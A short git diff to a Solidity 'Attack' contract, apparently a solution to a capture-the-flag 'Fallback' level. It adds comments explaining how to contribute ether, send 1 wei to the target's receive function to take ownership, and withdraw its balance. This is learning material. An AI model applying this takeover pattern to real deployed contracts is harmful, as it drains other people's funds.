@@ -57,7 +57,8 @@ contract Attack{
     fallback()external payable{
 
     }
-
+    
+    //here adding the just some ether to the Fallback contract
     function attack()external payable{
         (bool success,)=fc.call{value:msg.value}(
             abi.encodeWithSignature(
@@ -65,7 +66,8 @@ contract Attack{
             ));
         require(success,"call failed for contribute");
     }
-
+    
+    //here spaming the receive function by sending 1 wei to be owner and to withraw total ether in the contract
     function attackFoo()external payable{
          (bool suc,)=fc.call{value:msg.value}("");
        require(suc,"calling to receive failed");
